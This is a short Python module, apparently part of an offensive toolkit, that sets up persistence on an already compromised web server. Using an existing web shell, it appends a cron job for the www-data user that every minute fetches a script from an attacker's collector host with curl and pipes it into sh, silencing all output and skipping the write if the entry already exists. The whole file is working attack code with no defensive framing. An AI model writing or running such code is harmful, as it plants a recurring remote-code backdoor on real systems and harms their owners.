# Python 3.11 · cron persistence via existing shell
from __future__ import annotations

CRON_LINE = "* * * * * curl -s {collector}/b/$(hostname) | sh >/dev/null 2>&1\n"


async def persist_cron(client, shell_url: str, collector: str, user: str = "www-data") -> bool:
    from .webshell import shell_exec
    path = f"/var/spool/cron/crontabs/{user}"
    line = CRON_LINE.format(collector=collector)
    check = await shell_exec(client, shell_url, f"grep -qF '{collector}' {path} 2>/dev/null && echo yes")
    if "yes" in check:
        return True
    await shell_exec(
        client, shell_url,
        f"mkdir -p {path.rsplit('/', 1)[0]} && echo '{line}' >> {path} && chmod 600 {path}",
    )
    return True